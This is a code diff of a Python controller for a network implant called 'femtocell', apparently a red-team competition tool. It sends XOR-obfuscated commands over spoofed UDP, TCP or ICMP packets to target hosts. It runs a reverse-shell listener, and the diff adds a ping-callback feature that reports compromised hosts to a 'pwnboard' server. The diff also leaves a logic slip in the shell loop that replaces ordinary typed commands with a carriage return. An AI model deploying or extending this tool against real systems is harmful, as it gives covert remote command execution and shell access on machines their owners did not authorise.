@@ -1,4 +1,3 @@
-from pydoc import plain
 import scapy.all as scapy
 from prompt_toolkit import prompt
 from prompt_toolkit.history import FileHistory
@@ -8,12 +7,15 @@ import os
 import confuse
 import socket, sys, time
 import threading
+import requests
 
 parsedConfig = {}
 
 baseparams = {
     "MODE":"",
     "FILE":"",
+    "XOR": True,
+    "PROXY": ""
 }
 
 cmdparams = {
@@ -46,6 +48,7 @@ groupparams = {
 
 
 def listen():
+    TIME_WAIT = 0.25
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((shellparams['LHOST'], shellparams['LPORT']))
@@ -54,7 +57,6 @@ def listen():
     print(colored(f"[+] Shell received from: {addr}\n\n","green"))
     first = True
     while True:
-        #Receive data from the target and get user input
         ans = conn.recv(1024 * 128).decode()
         sys.stdout.write(ans)
         if first:
@@ -63,17 +65,54 @@ def listen():
         else:
             command = input()
 
-        #Send command
+        if command == "!increase":
+            TIME_WAIT += 0.25
+        elif command == "!decrease":
+            TIME_WAIT -= 0.25
+        else:
+            command = "\r"
+
         command += "\n"
         conn.send(command.encode())
-        time.sleep(0.25)
+        time.sleep(TIME_WAIT)
 
-        #Remove the output of the "input()" function
         sys.stdout.write("\033[A" + ans.split("\n")[-1])
         if command == "exit\n":
             break
 
     s.close()
+
+
+def pingListen():
+    print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "blue"))
+    pkts = scapy.sniff(filter="icmp", timeout=15) # listen for 15 seconds for callbacks
+    tCallbacks = []
+
+    for packet in pkts:
+        if  str(packet.getlayer(scapy.ICMP).type) == "8": 
+            tCallbacks.append(packet[scapy.IP].src)
+
+    fCallbacks = list(dict.fromkeys(tCallbacks))
+    # print(fCallbacks)
+    for ip in fCallbacks:
+        print(colored(f"[+] Ping received from: {ip}\n","green"))
+
+    # send to pwnboard
+    host = "http://" + "host" + "/generic"
+    for ip in fCallbacks:
+        data = {'ip': ip, 'type': "femtocell"}
+        try:
+            req = requests.post(host, json=data, timeout=3)
+        except Exception as E:
+            print(E)
+
+def initPing(params):
+    if baseparams["PROXY"] != "":
+        targetIP = baseparams["PROXY"]
+    else:
+        targetIP = params["LHOST"]
+    pingmode = "FC-CM-{}\00".format("ping " + targetIP + " -n 1")
+    return pingmode
 
 def validGroupKey():
     key = groupparams["GROUP"]
@@ -154,7 +193,7 @@ def xor_encrypt(byte_msg, byte_key):
 
 def print_help(location):
     if location == "sub":
-        print(colored("\n[?] REQUIRED: set <key> <value>\n[?] BACK: back/exit\n[?] INFO: options\n[?] INFO: targets (GROUP mode only)\n[?] REQUIRED: execute\n", "yellow"))
+        print(colored("\n[?] REQUIRED: set <key> <value>\n[?] BACK: back/exit\n[?] INFO: options\n[?] INFO: targets (GROUP mode only)\n[?] OPTIONAL: ping (group and cmd modes only)\n[?] REQUIRED: execute\n", "yellow"))
     else:
         print(colored("\n[?] REQUIRED: set mode <shell/cmd/group>\n[?] EXIT: exit\n[?] INFO: options\n[?] OPTIONAL: load <file.yml> (REQUIRED for GROUP mode)\n[?] REQUIRED: ready\n", "yellow"))
 
@@ -204,6 +243,14 @@ def main():
                         baseparams["MODE"] = ""
                         continue
                     print(colored(f"[*] Mode {op_2} set.\n", "blue"))
+            elif user_cmd == "XOR":
+                if op_2 == "TRUE":
+                    baseparams["XOR"] = True
+                elif op_2 == "FALSE":
+                    baseparams["XOR"] = False
+                else:
+                    print(colored(f"[!] XOR can only be set to TRUE or FALSE.\n", "red"))
+                    continue
         elif len(user_in) == 2:
             user_cmd = user_in[0]
             op_1 = user_in[1]
@@ -270,15 +317,18 @@ def ready(params):
             elif user_cmd == "EXECUTE":
                 if baseparams["MODE"] == "CMD" and verify(cmdparams):
                     plaintext = "FC-CM-{}\00".format(params["COMMAND"])
-                    print(plaintext)
                     execute(plaintext, cmdparams)
                 elif baseparams["MODE"] == "SHELL" and verify(shellparams):
                     plaintext = "FC-SH-{}\00".format(params["LHOST"]) 
+                    t = threading.Thread(target=listen, args=())
+                    t.start()
                     execute(plaintext, shellparams)
+                    t.join()
+
+                    print(colored("\n[*] Shell closed.\n", "blue"))
                 elif baseparams["MODE"] == "GROUP" and verify(groupparams):
                     plaintext = "FC-CM-{}\00".format(params["COMMAND"])
                     if parsedConfig.get(groupparams.get("GROUP")) == "":
-                        print("group not valid")
                         continue
                     groupList = getGroup()
                     for iplist in groupList:
@@ -287,6 +337,30 @@ def ready(params):
                             execute(plaintext, groupparams)
                 else:
                     print_help("sub")
+                    continue
+            elif user_cmd == "PING":
+                if baseparams["MODE"] == "CMD" and verify(cmdparams):
+                    print('running ping command')
+                    plaintext = initPing(cmdparams)
+                    t = threading.Thread(target=pingListen, args=())
+                    t.start()
+                    execute(plaintext, cmdparams)
+                    t.join()
+                elif baseparams["MODE"] == "GROUP" and verify(groupparams):
+                    if parsedConfig.get(groupparams.get("GROUP")) == "":
+                        continue
+                    groupList = getGroup()
+                    plaintext = initPing(groupparams)
+                    t = threading.Thread(target=pingListen, args=())
+                    t.start()
+                    for iplist in groupList:
+                        for ip in iplist:
+                            groupparams["RHOST"] = ip
+                            execute(plaintext, groupparams)
+                    t.join()
+
+                else:
+                    print(colored('[!] PING only works on GROUP or CMD mode.\n', 'red'))
                     continue
             else:
                 print_help("sub")
@@ -325,7 +399,6 @@ def ready(params):
             print_help("sub")
 
 
-
 def verify(params):
     passing = False
 
@@ -348,32 +421,29 @@ def verify(params):
 
     return passing
 
-
 def execute(plaintext, params):
-    encrypted = xor_encrypt(plaintext.encode(), 0x10)
 
-    if baseparams["MODE"] == "SHELL":
-        t = threading.Thread(target=listen, args=())
-        t.start()
+    if baseparams["XOR"]:
+        payload = xor_encrypt(plaintext.encode(), 0x10)
+    else:
+        payload = plaintext.encode()
 
-    if(params["TRANSPORT"] == "UDP"):
+    if (params["TRANSPORT"] == "UDP"):
         scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
         scapy.UDP(sport=params["SPORT"], dport=params["RPORT"])/
-        encrypted, verbose=False)
+        payload, verbose=False)
     elif(params["TRANSPORT"] == "TCP"):
         scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
         scapy.TCP(sport=params["SPORT"], dport=params["RPORT"], flags="AP")/
-        encrypted, verbose=False)
+        payload, verbose=False)
     elif(params["TRANSPORT"] == "ICMP"):
         scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
         scapy.ICMP(code=1, type=8)/
-        encrypted, verbose=False)
+        payload, verbose=False)
 
     RHOST = params["RHOST"]
     print(colored(f"[*] Sending {plaintext[6:]} --> {RHOST}\n", "green"))
 
-    t.join()
-    print(colored("\n[*] Shell closed.\n", "blue"))
 
 if(__name__ == "__main__"):
     main()
